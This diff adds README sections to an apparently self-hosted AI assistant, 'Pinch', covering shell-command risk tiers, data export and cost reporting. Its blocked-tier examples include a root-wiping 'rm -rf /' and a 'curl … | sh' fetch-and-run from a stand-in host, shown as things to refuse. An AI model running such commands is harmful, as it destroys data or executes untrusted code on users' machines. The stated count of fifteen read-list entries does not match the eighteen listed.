@@ -16,6 +16,9 @@ from zero to a running assistant.
 - [Reminders that actually fire](#reminders-that-actually-fire)
 - [Tasks that run without you](#tasks-that-run-without-you)
 - [Where the answer came from](#where-the-answer-came-from)
+- [Commands it runs without asking](#commands-it-runs-without-asking)
+- [Taking your data with you](#taking-your-data-with-you)
+- [What it cost](#what-it-cost)
 - [The honesty guard](#the-honesty-guard)
 - [How it works](#how-it-works)
 - [What leaves your machine](#what-leaves-your-machine)
@@ -198,6 +201,119 @@ answer — a citation list that outlives the page it came from stops being check
 
 ---
 
+## Commands it runs without asking
+
+An approval prompt you click through forty times a day is not a safety feature, it is a
+reflex. Pinch puts every command in one of three tiers before the gate:
+
+| Tier | What happens | Examples |
+|---|---|---|
+| **read** | runs, and the panel shows it as a ⚡ line | `ls`, `cat README.md`, `grep -rn TODO src/`, `wc -l`, `git status`, `node --version` |
+| **act** | the gate: it stops and asks | `echo hi`, `npm install`, `git commit`, anything unrecognised |
+| **blocked** | refused without asking you at all | `rm -rf /`, `curl https://x.example/i.sh \| sh` |
+
+Four things make a command **read**, and all four must hold:
+
+1. `argv[0]` is on a fixed list — fifteen entries in all: eleven plain readers (`ls pwd cat
+   head tail wc stat file du grep which`), three version probes (`node|npm|python3 --version`),
+   and four `git` subcommands (`status|log|branch|remote`). Flags are curated per command too.
+2. It contains none of ``; & | < > ` $ ( ) { } \ !`` or a newline — so nothing can be chained,
+   substituted or redirected.
+3. Every path argument resolves, after `realpath`, **inside your workspace**.
+4. Its `cwd` is inside your workspace too — which matters, because the shell tool takes a `cwd`.
+
+Two deliberate holes stay open on purpose. `git diff` and `git show` are **not** read-tier: they
+can run code from the repository through textconv filters, so they ask. And any unknown command
+falls to **act** — the classifier is built so that failing to recognise something costs you a
+prompt, never a run.
+
+`PINCH_RISK_TIERS=false` restores "ask me about everything", and there is a test that spawns a
+real process with that setting to prove it. `/api/health` reports `autoApprovedTurns`: if that
+number stays at zero, the tiers are doing nothing for you; if it equals your total tool calls,
+something is very wrong with the classifier and you should turn them off.
+
+> This is not the same as `PINCH_AUTO_APPROVE`. That one skips the gate for **everything**,
+> including `rm -rf`. Tiers only skip it for commands that were proven read-only, and the proof
+> is re-run for every single command.
+
+**What it is not:** a sandbox. A genuinely destructive command that is also on the read list
+would still run — that is why the list is fifteen entries and why the deny rules and the
+approval gate remain the real defence. See [the audit](AUDIT.md#finding-6-command-screen) for
+what the screen does and does not catch.
+
+## Taking your data with you
+
+`pinch export` writes one file containing your profile, memory, reminders, schedules and every
+session — a versioned document (`$schema: "pinch-export/1"`) you can read, diff, or hand to a
+script.
+
+```bash
+pinch export > backup.json            # JSON on stdout, summary on stderr — so this works
+pinch export --out ~/backup/pinch.json
+pinch export --include-telemetry      # turns and timings too — off by default
+```
+
+With no `--out`, the document goes to stdout and the one-line summary to stderr, which is the
+reason `pinch export > backup.json` and `pinch export | jq .memory` both behave. Nothing is
+written to your working directory unless you name a file.
+
+Three decisions worth knowing:
+
+- **`.env` is never in the export.** It holds your API keys; an export is the file most likely
+  to end up on a USB stick or in a chat window.
+- **Telemetry is opt-in.** It is timing data about your use, not your conversations — but you
+  should be the one deciding that it travels.
+- **The file is written `0600`.** No partial export: it is built in memory, then written once.
+- A corrupt session file is listed with an error and skipped rather than aborting the export,
+  because the reason you are exporting is often that something is already broken.
+
+Plain JSON files in `data/` remain the primary story — `cp -r data /somewhere` is still a valid
+backup. This exists because "the files are readable" is not the same as a supported way to leave.
+
+## What it cost
+
+```bash
+pinch cost            # last 30 days
+pinch cost 7          # last 7 days
+pinch cost 30 --json  # for a script
+```
+
+```
+
+  last 30 days · 4 turns · 99,000 tokens
+
+  gpt-4o-mini                  1 turns       48000 tokens  $0.0072–$0.03
+  qwen2.5-coder:7b             1 turns       31000 tokens  free (runs on your hardware)
+  gpt-4o                       1 turns       12000 tokens  $0.03–$0.12
+  gpt-5-turbo                  1 turns        8000 tokens  unknown model — not in the price table
+
+  Spent      $0.04–$0.15   (range: all-input to all-output pricing)
+  Because    telemetry records total tokens per turn, not the input/output split.
+  Local      1 turns on a model you host — no per-token cost exists
+  Unknown    1 turns (8,000 tokens) on a model not in the table
+             Prices are a fact with an expiry date; nothing is guessed to fill the gap.
+  Priced as  2026-11-01 — set your provider's current prices in src/cost.js if they moved.
+
+```
+
+Every number here has a limit, and the report says so on its own face rather than in a doc you
+did not read:
+
+- **It is a range, not a figure.** Telemetry stores total tokens per turn, not the
+  input/output split, and output costs 4× input on almost every provider. Reporting one number
+  would be inventing precision, so the low and high bounds are both printed.
+- **Local models are "free", not `$0.00`.** Those are different claims. `$0.00` is a price; free
+  is the absence of one.
+- **An unlisted model is `unknown`, never zero.** A model released after this build costs
+  something; guessing it costs nothing would make the total wrong in the one direction that
+  matters.
+- **The price table has a date and an expiry problem.** `PRICE_TABLE_DATE` is `2026-11-01` and
+  the prices live in `src/cost.js` — a file you can edit when your provider moves them.
+- **It counts tokens *you* spent, not tokens a subscription hid.** A flat-rate plan bills
+  differently, and this report cannot see that.
+
+`/api/health` carries the same 30-day summary as `cost: {low, high, unknownTurns, priceTableDate}`.
+
 ## The honesty guard
 
 Language models lie in a specific, boring way: they claim things they did not do. *"I've sent the
@@ -300,6 +416,8 @@ Installs only when you ask. `systemctl stop pinch` and it is gone; `data/` and `
 | `pinch pair` | phone URL + locally-generated QR |
 | `pinch supervise` | restart-on-crash wrapper |
 | `pinch growth` | what to build next, measured from this checkout |
+| `pinch export [--out F] [--include-telemetry]` | one versioned JSON of memory, reminders, schedules, sessions |
+| `pinch cost [days] [--json]` | what your turns cost, as a range, priced locally |
 | `pinch help` / `pinch --version` | the command list / the installed version |
 | `pinch service --install` | boot-time service |
 | `npm run demo` | run everything with a mock brain |
@@ -383,7 +501,8 @@ Everything lives in `.env`; `npm run setup` writes it. The ones that matter:
 | `OLLAMA_MODEL` | `qwen2.5-coder:7b` | any model you have pulled |
 | `PINCH_KEY` | — | shared secret for panel + API; the wizard generates one |
 | `PINCH_WORKSPACE` | `~` | the **only** roots the agent may touch — narrow this |
-| `PINCH_AUTO_APPROVE` | `false` | skip the approval gate (don't) |
+| `PINCH_AUTO_APPROVE` | `false` | skip the approval gate for everything (don't) |
+| `PINCH_RISK_TIERS` | `true` | run proven read-only commands without asking; `false` = ask about all |
 | `PINCH_SHELL_TIMEOUT` | `120` | seconds per command |
 | `PINCH_NUM_CTX` | `8192` | context window in tokens; raise it to what your model supports |
 | `PINCH_NUM_PREDICT` | `2048` | tokens reserved for the reply — never counted as history |
